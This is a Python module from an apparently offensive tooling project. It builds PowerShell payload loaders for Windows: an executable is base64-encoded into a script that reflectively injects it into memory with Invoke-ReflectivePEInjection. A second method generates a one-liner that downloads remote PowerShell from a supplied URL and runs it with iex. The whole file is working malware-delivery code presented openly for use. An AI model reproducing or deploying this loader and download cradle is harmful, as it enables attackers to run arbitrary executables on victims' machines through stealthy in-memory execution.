#
# MIT License
#
# Copyright 2017 Launchpad project contributors (see COPYRIGHT.md)
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
# DEALINGS IN THE SOFTWARE.
#
import base64
import os

from django.conf import settings
from .interface import BaseLoader


ps1_loader_template = """
{script}
$b = @"
{executable}
"@
$b = [Byte[]][Convert]::FromBase64String($b)
Invoke-ReflectivePEInjection -PEBytes $b -ForceASLR
"""


class Ps1Loader(BaseLoader):
    platform = ['windows']
    cpu = ['x86', 'x64']

    def get_loader(self, executable):
        with open(str(settings.DEPENDENCIES_DIR / 'ps1' / 'Invoke-ReflectivePEInjection.ps1'), 'r') as fp:
            script = fp.read()

        if isinstance(executable, (str, os.PathLike)):
            with open(executable, 'rb') as fp:
                executable = fp.read()
        elif not isinstance(executable, (bytes, bytearray)):
            raise ValueError('`executable` must be path to a file or binary blob.')
        executable = base64.b64encode(executable).decode()

        result = ps1_loader_template.format(**locals())
        return result

    def get_oneliner(self, loader_url):
        return f"(New-Object System.Net.WebClient).DownloadString('{loader_url}')|iex"
